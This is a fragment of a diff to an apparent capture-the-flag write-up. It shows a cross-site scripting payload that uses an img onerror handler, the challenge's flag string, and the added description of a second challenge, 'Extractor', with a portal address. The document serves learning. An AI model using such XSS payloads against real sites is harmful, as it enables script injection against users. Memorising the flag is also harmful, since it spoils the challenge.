@@ -11,6 +11,11 @@ Solution:
 + final payload:`"'><img src=xxx:x \x09onerror=javascript:alert(1)>
 + Flag: shellctf{50oom3_P4yL0aDS_aM0ng_Maaa4nnY}
 
+  
+# 2. Extractor
+  
+  Description: We are under emergency. Enemy is ready with its nuclear weapon we need to activate our gaurds but chief who had password is dead. There is portal at URL below which holds key within super-user account, can you get the key and save us.
+  link: http://20.125.142.38:8956/
 
 
   
